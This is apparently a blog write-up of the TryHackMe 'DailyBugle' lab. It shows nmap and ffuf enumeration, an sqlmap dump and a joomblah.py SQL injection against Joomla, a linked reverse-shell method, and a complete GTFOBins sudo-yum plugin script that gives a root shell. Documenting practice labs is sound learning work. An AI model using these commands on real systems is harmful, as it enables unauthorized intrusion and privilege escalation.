---
title: "DailyBugle Writeup THM"
description: "My writeup of the TryHackMe room [DailyBugle](https://tryhackme.com/room/dailybugle)"
date: 2024-01-01T10:00:00+01:00
image: https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Joomla
categories:
    - Room
    - Hard
---

The first thing that we are going to do is a nmap scan:

```bash
sudo nmap -A 10.10.62.253

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-30 10:48 EST
Nmap scan report for 10.10.62.253
Host is up (0.063s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

This is our output, we see that there are 3 ports open,

- ssh(useless for now)
- http
- 3306, which is used by MariaDB

The first thing that I am going to do is exploring the web page

![Untitled](https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png)

After trying some thing, I cam accross the robots.txt directory:

```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

This is the output.

For now I am going to ignore it.

Now I just started sqlmap with the request that I captured from the login form:

```bash
└─$ sqlmap -r Desktop/response.txt --dbms=mariadb --dump --threads=5
```

And then I ran ffuf for directory enumeration:

```bash
ffuf -u http://10.10.62.253/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.62.253/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5237ms]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5361ms]
administrator           [Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 80ms]
bin                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 79ms]
cache                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 80ms]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 80ms]
cli                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 82ms]
components              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 94ms]
images                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 76ms]
includes                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 79ms]
language                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 80ms]
layouts                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms]
libraries               [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 77ms]
media                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 79ms]
modules                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms]
plugins                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 79ms]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 80ms]
templates               [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 71ms]
tmp                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 80ms]
:: Progress: [20469/20469] :: Job [1/1] :: 265 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```

Ok, now that I have more informations, I can visit the administrator page:

![Untitled](https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled%201.png)

Nice, we have the jomla login panel.

Now we can run OWASP joomscan, and find the version.

After that I searched for an exploit, and found this python script:

```bash
python3 joomblah.py http://10.10.62.253


    .---.    .-'''-.        .-'''-.
    |   |   '   _    \     '   _    \                            .---.
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
|____.'                                                                `--'  `" '---'   '---'

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: <redacted>
  -  Extracting users from <redacted>
 [$] Found user ['<redacted>']
  -  Extracting sessions from <redacted>
```

After finding the hash of Jonah, I just went to hashidentifier and cracked it.

Now for creating a reverse shell I found this Article online: https://www.hackingarticles.in/joomla-reverse-shell/

I followed and I got a rev shell.

I upgraded the shell using:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

And found the jjameson’s password inside linpeas.

Now we need to become root.

I used sudo -l  to list all the privileges:

```bash
sudo -l

Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

And then went to gtfobins and used this for a root shell:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
